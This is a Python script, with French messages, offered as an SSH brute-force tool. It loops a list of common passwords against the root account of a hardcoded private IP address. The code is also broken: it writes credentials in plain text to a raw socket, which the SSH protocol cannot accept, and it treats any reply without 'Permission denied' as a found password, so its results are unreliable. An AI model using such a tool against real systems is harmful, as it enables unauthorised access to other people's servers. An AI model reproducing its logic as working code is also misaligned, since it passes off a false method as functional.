import socket

class SSHBruteforcer:
    def __init__(self, target, port, common_passwords):
        self.target = target
        self.port = port
        self.common_passwords = common_passwords

    def ssh_bruteforce(self, username):
        nb_test = 0
        for password in self.common_passwords:
            if self._attempt_connection(username, password, nb_test):
                print("Mot de passe trouvé pour SSH:", password)
                return True
            nb_test += 1
        print("Aucun mot de passe trouvé pour SSH.")
        return False

    def _attempt_connection(self, username, password, nb_test):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((self.target, self.port))
            banner = sock.recv(1024).decode('utf-8')
            if 'SSH' not in banner:
                print("Le service n'est pas un serveur SSH.")
                return False
            
            sock.send(f'{username}\n'.encode('utf-8'))
            sock.send(f'{password}\n'.encode('utf-8'))
            
            response = sock.recv(1024).decode('utf-8')
            if 'Permission denied' not in response:
                return True
            else:
                print("Mot de passe incorrect, tentative", nb_test + 1)
                return False
        except Exception as e:
            print("Erreur:", e)
            return False
        finally:
            sock.close()

def main():
    target = "192.168.0.38"
    port = 22
    common_passwords = ["123456", "qwerty", "azerty", "1234", "admin","password"]
    bruteforcer = SSHBruteforcer(target, port, common_passwords)
    bruteforcer.ssh_bruteforce("root")

if __name__ == "__main__":
    main()